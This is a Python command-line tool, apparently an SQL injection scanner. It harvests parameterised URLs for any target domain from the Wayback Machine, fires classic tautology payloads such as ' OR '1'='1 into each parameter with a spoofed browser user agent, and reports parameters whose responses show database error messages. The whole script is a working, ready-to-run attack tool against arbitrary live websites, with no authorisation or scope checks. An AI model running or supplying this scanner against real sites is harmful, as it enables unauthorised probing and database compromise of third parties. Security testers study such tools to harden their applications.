import requests
import httpx
import re
import urllib.parse
import argparse

def gather_urls(target):
    wayback_url = f"http://web.archive.org/cdx/search/cdx?url={target}/*&output=json&fl=original&collapse=urlkey"
    print("Fetching URLs from Wayback Machine...")
    try:
        response = requests.get(wayback_url)
        response.raise_for_status()
        urls = [item[0] for item in response.json()[1:] if '?' in item[0]]
        print(f"Found {len(urls)} URLs with parameters.")
        return urls
    except requests.RequestException as e:
        print(f"Error fetching URLs from Wayback Machine: {e}")
        return []

def generate_payloads(url):
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)
    payloads = []
    sqli_payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --", "' OR 'a'='a", "' OR '1'='2"]

    for param in query_params:
        for payload in sqli_payloads:
            new_query = urllib.parse.urlencode({param: payload})
            manipulated_url = urllib.parse.urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            payloads.append(manipulated_url)
    
    return payloads

def check_sqli(url, headers, timeout, error_patterns):
    try:
        response = httpx.get(url, headers=headers, timeout=timeout)
        if error_patterns.search(response.text):
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            benign_query = urllib.parse.urlencode({param: "test" for param in query_params})
            benign_url = urllib.parse.urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                benign_query,
                parsed_url.fragment
            ))
            benign_response = httpx.get(benign_url, headers=headers, timeout=timeout)
            if not error_patterns.search(benign_response.text):
                print(f"Potential SQLi found: \"{url}\"")
                return url
    except httpx.RequestError as e:
        print(f"Request error occurred: {e}")
    return None

def main(target):
    urls = gather_urls(target)
    all_vulnerabilities = []
    
    if urls:
        print("Analyzing URLs for SQL injection vulnerabilities. Please wait...")
        headers = {
            "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                           "(KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3")
        }
        timeout = 10
        error_patterns = re.compile(
            r"(\bSQL\b|\bsyntax\b|\berror\b|\bORA-\b|\bMicrosoft\b|\bODBC\b|\bJDBC\b|\bSQLException\b|"
            r"\bMySQL\b|\bMariaDB\b|\bPostgreSQL\b|\bPGSQL\b|\bSQLite\b|\bSyntax error\b|"
            r"\bUnclosed quotation mark\b|\bquoted string not properly terminated\b|"
            r"\bSQL Server\b|\bUnexpected end of command\b|"
            r"\bserver version\b|\bSQL command not properly ended\b|\binvalid identifier\b|"
            r"\bsqlite3\b|\bunterminated quoted string\b|\binvalid input syntax\b|"
            r"\bFatal error\b|\bWarning\b)",
            re.IGNORECASE
        )

        for url in urls:
            manipulated_urls = generate_payloads(url)
            for manipulated_url in manipulated_urls:
                vulnerability = check_sqli(manipulated_url, headers, timeout, error_patterns)
                if vulnerability:
                    all_vulnerabilities.append(vulnerability)
    
    if all_vulnerabilities:
        print("\nSummary of potential SQL injection vulnerabilities found:")
        for vuln in all_vulnerabilities:
            print(f"\033[91m\"{vuln}\"\033[0m")
    else:
        print("\033[92mNo SQL injection vulnerabilities found.\033[0m")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='SQLi Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    args = parser.parse_args()
    
    main(args.url)
